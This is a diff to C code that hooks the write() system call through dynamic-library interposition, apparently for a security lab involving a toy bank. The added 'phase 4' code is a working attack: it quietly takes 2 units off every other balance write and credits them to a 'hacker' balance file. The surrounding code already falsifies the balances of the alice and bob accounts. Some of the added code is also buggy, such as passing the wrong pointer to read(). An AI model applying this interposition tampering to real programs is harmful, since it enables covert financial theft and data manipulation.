@@ -107,7 +107,9 @@ int open(const char *pathname, int flags, ...) {
 
 } */
 
-
+int phase4_skim = 0;
+int phase4_hacker_bal;
+int phase4_start = 1;
 ssize_t write(int fd, const void *buf, size_t count){
 	static ssize_t (*origwrite)(int fd, const void *buf, size_t count) = NULL;
 	origwrite = (ssize_t (*)(int, const void*, size_t))dlsym(RTLD_NEXT, "write");
@@ -121,7 +123,7 @@ ssize_t write(int fd, const void *buf, size_t count){
 			snprintf(temp_buffer, 5, "%d", currBal);
 			buf = (const void*)temp_buffer;
 		}
-		
+
 		else if (fd == 3) { // bob
 			int currBal = atoi((char*)buf);
 			currBal = currBal - 200;
@@ -130,6 +132,62 @@ ssize_t write(int fd, const void *buf, size_t count){
 			buf = (const void*)temp_buffer;
 		}
 	}
+
+	if (strcmp(phaseNum, "4")==0)  {
+		if (phase4_start) {
+			int hackerFd = open("hacker.data", 2, 0600);
+			char* hackerBuffer1 = malloc(5);
+			read(hackerFd, &hackerBuffer1, 5);
+			phase4_hacker_bal = atoi(hackerBuffer1);
+			phase4_start = 0; // need to reset to 1 when done w phase4
+		}
+		if(phase4_skim){
+
+			/* skim off transaction */
+
+			// decrement balance of receiver by one
+			int currBal = atoi((char*)buf);
+			currBal = currBal - 2;
+
+			// convert back to void *
+			char *temp_buffer = malloc(5);
+			snprintf(temp_buffer, 5, "%d", currBal);
+			buf = (const void*)temp_buffer;
+
+			/* allocate to hacker */
+
+			// get file descriptor
+			//int hackerFd = open("hacker.data", 2, 0600);
+			//fprintf(stderr,"FILE DESCRIPTOR: %d\n",hackerFd);
+
+			// read balance from hacker file
+/* 			char hackerBuffer1[5];
+			FILE *fp = fopen("hacker.data","r");
+			int i = 0;
+			while(feof(fp)){
+				hackerBuffer1[i++] = fgetc(fp);
+			}
+			hackerBuffer1[i] = '\0'; */
+
+			// char* hackerBuffer1 = malloc(5);
+			// read(hackerFd, &hackerBuffer1, 5);
+
+			// increment hacker balance by one
+			//int hackerBal = atoi(hackerBuffer1);
+			phase4_hacker_bal = phase4_hacker_bal + 2;
+			fprintf(stderr,"hackerbalance: %d\n",phase4_hacker_bal);
+
+			// convert back to void *
+			int hackerBalStringLength = snprintf( NULL, 0, "%d", phase4_hacker_bal );
+			char *hackerBuffer2 = malloc(hackerBalStringLength+1);
+			snprintf(hackerBuffer2, hackerBalStringLength+1, "%d", phase4_hacker_bal);
+			const void * hackerWriteBuff = (const void*)hackerBuffer2;
+			origwrite(6, hackerWriteBuff, hackerBalStringLength+1);
+		}
+		phase4_skim = !phase4_skim;
+	}
+
+
 	return origwrite(fd, buf, count);
 }
 
